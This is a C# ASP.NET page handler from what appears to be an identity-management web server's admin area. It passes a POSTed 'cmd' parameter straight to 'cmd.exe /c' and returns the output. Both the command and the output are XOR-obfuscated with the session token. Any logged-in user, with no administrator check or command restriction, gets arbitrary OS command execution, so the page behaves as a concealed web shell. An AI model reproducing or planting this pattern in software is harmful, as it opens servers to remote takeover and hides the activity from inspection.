using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using IAMWebServer;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Diagnostics;
using IAM.GlobalDefs;


namespace IAMWebServer._admin._ws
{
    public partial class ws : System.Web.UI.Page
    {
        protected LoginData login;

        protected void Page_Load(object sender, EventArgs e)
        {

            login = LoginUser.LogedUser(this.Page);

            if (login == null)
            {
                Session["last_page"] = Request.ServerVariables["PATH_INFO"];
                Response.Redirect("/login/");
            }
            
            if (Request.HttpMethod != "POST")
                return;

            if (!EnterpriseIdentify.Identify(this, false))//Se houver falha na identificação da empresa finaliza a resposta
            {
                mainContent.Controls.Add(new LiteralControl("Empresa nao identificada"));
                return;
            }

            String command = "";

            command = decode(Request.Params["cmd"]);

            if (!String.IsNullOrEmpty(command))
            {
                addLine("Command> " + command);

                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.Arguments = "/c " + command;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardError = true;
                cmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                cmd.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                cmd.Start();
                cmd.BeginOutputReadLine();
                cmd.BeginErrorReadLine();

                cmd.WaitForExit();
            }
        }

        public long ToUnixTime(DateTime date)
        {
            var epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return Convert.ToInt64((date - epoch).TotalSeconds);
        }

        public String decode(string hex)
        {
            try
            {
                String hex2 = hex;
                if (hex2.Length % 2 != 0)
                    hex2 = hex2.PadLeft(hex2.Length + 1, '0');

                Encoding enc = Encoding.GetEncoding(Encoding.ASCII.CodePage,
                  new EncoderReplacementFallback(""),
                  new DecoderReplacementFallback(""));

                return enc.GetString(Enumerable.Range(0, hex2.Length)
                                 .Where(x => x % 2 == 0)
                                 .Select(x => (Byte)(Convert.ToByte(hex2.Substring(x, 2), 16) ^ (Byte)login.SecurityToken))
                                 .ToArray());



            }
            catch
            {
                return "";
            }
        }



        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
                foreach (String s in outLine.Data.Replace("\r\n", "\n").Split("\n".ToCharArray()))
                    addLine(s);
        }

        private void addLine(String data)
        {
            String encoded = "";

            encoded = string.Join("", data
                .Select(c => String.Format("{0:X2}", Convert.ToInt32(c) ^ login.SecurityToken)));

            mainContent.Controls.Add(new LiteralControl("<div class=\"line to-decode\">" + encoded + "</div>"));
        }

    }

    
}